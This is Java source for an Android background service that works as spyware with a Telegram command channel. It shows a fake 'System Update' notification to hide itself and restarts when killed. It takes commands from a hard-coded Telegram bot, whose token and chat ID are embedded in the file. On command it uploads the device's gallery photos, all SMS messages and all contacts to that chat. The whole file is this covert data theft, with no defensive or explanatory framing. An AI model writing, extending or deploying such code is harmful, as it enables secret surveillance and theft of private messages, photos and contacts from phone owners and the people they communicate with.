package com.vipih;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BackgroundService extends Service {
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private Context ctx;

    @Override
    public void onCreate() {
        super.onCreate();
        ctx = getApplicationContext();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = "sys_channel";
            NotificationChannel channel = new NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
            Notification notification = new Notification.Builder(this, channelId)
                    .setContentTitle("Update")
                    .setContentText("Updating system components...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendControlPanel();
            }
        }).start();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    while (isRunning) {
                        checkUpdates();
                        Thread.sleep(2000);
                    }
                } catch (Exception e) {}
            }
        }).start();
        
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void sendControlPanel() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");

            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", "✅ Connected successfully!\n\nChoose an action:");

            JSONArray keyboard = new JSONArray();
            
            JSONArray row1 = new JSONArray();
            JSONObject btnPhotos = new JSONObject();
            btnPhotos.put("text", "📸 Get Photos");
            btnPhotos.put("callback_data", "cmd_photos");
            row1.put(btnPhotos);
            keyboard.put(row1);

            JSONArray row2 = new JSONArray();
            JSONObject btnSms = new JSONObject();
            btnSms.put("text", "💬 Get SMS");
            btnSms.put("callback_data", "cmd_sms");
            row2.put(btnSms);
            keyboard.put(row2);

            JSONArray row3 = new JSONArray();
            JSONObject btnContacts = new JSONObject();
            btnContacts.put("text", "📞 Get Contacts");
            btnContacts.put("callback_data", "cmd_contacts");
            row3.put(btnContacts);
            keyboard.put(row3);

            JSONObject replyMarkup = new JSONObject();
            replyMarkup.put("inline_keyboard", keyboard);
            json.put("reply_markup", replyMarkup);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(json.toString());
            os.flush();
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void checkUpdates() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            InputStream input = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(input));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            JSONObject jsonResponse = new JSONObject(response.toString());
            JSONArray result = jsonResponse.getJSONArray("result");
            
            for (int i = 0; i < result.length(); i++) {
                JSONObject update = result.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                
                if (update.has("callback_query")) {
                    JSONObject callbackQuery = update.getJSONObject("callback_query");
                    String data = callbackQuery.getString("data");
                    String callbackId = callbackQuery.getString("id");

                    answerCallback(callbackId, "Processing...");

                    if (data.equals("cmd_photos")) {
                        sendPhotos();
                    } else if (data.equals("cmd_sms")) {
                        sendSms();
                    } else if (data.equals("cmd_contacts")) {
                        sendContacts();
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void answerCallback(String callbackId, String text) {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery?callback_query_id=" + callbackId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendPhotos() {
        try {
            String[] projection = {MediaStore.Images.Media._ID};
            Cursor cursor = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor == null) return;
            int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            List<Uri> batchUris = new ArrayList<>();

            while (cursor.moveToNext()) {
                int id = cursor.getInt(idIndex);
                Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
                batchUris.add(contentUri);

                if (batchUris.size() == 10) {
                    sendMediaGroup(batchUris);
                    batchUris.clear();
                    Thread.sleep(300);
                }
            }
            cursor.close();
            if (!batchUris.isEmpty()) sendMediaGroup(batchUris);
            sendMsg("✅ Photos completed.");
        } catch (Exception e) {}
    }

    private void sendSms() {
        try {
            StringBuilder smsBuilder = new StringBuilder();
            Cursor cursor = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    smsBuilder.append("From: ").append(address).append("\nMsg: ").append(body).append("\n-------------------\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
            sendFile("messages_sms.txt", smsBuilder.toString());
            sendMsg("✅ SMS completed.");
        } catch (Exception e) {
            sendMsg("❌ SMS Error: " + e.getMessage());
        }
    }

    private void sendContacts() {
        try {
            StringBuilder contactsBuilder = new StringBuilder();
            Cursor cursor = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsBuilder.append("Name: ").append(name).append(" | Phone: ").append(phone).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
            sendFile("contacts.txt", contactsBuilder.toString());
            sendMsg("✅ Contacts completed.");
        } catch (Exception e) {
            sendMsg("❌ Contacts Error: " + e.getMessage());
        }
    }

    private void sendMsg(String text) {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendFile(String filename, String content) {
        try {
            String boundary = "*****" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"" + lineEnd);
            request.writeBytes("Content-Type: text/plain" + lineEnd + lineEnd);
            request.write(content.getBytes("UTF-8"));
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            request.flush();
            request.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendMediaGroup(List<Uri> uris) {
        String boundary = "*****" + System.currentTimeMillis();
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMediaGroup");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            JSONArray mediaArray = new JSONArray();
            List<byte[]> imageDataList = new ArrayList<>();

            for (int i = 0; i < uris.size(); i++) {
                byte[] data = compressImage(uris.get(i));
                if (data != null) {
                    imageDataList.add(data);
                    JSONObject mediaObj = new JSONObject();
                    mediaObj.put("type", "photo");
                    mediaObj.put("media", "attach://file" + i);
                    mediaArray.put(mediaObj);
                }
            }

            if (imageDataList.isEmpty()) return;

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
            request.writeBytes(mediaArray.toString() + lineEnd);

            for (int i = 0; i < imageDataList.size(); i++) {
                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"file" + i + "\"; filename=\"img" + i + ".jpg\"" + lineEnd);
                request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
                request.write(imageDataList.get(i));
                request.writeBytes(lineEnd);
            }

            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush();
            request.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private byte[] compressImage(Uri uri) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            InputStream input = ctx.getContentResolver().openInputStream(uri);
            BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();

            int inSampleSize = 1;
            if (options.outHeight > 800 || options.outWidth > 800) {
                final int halfHeight = options.outHeight / 2;
                final int halfWidth = options.outWidth / 2;
                while ((halfHeight / inSampleSize) >= 800 && (halfWidth / inSampleSize) >= 800) {
                    inSampleSize *= 2;
                }
            }
            options.inJustDecodeBounds = false;
            options.inSampleSize = inSampleSize;

            input = ctx.getContentResolver().openInputStream(uri);
            Bitmap bitmap = BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();
            if (bitmap == null) return null;

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream);
            bitmap.recycle();
            return stream.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
}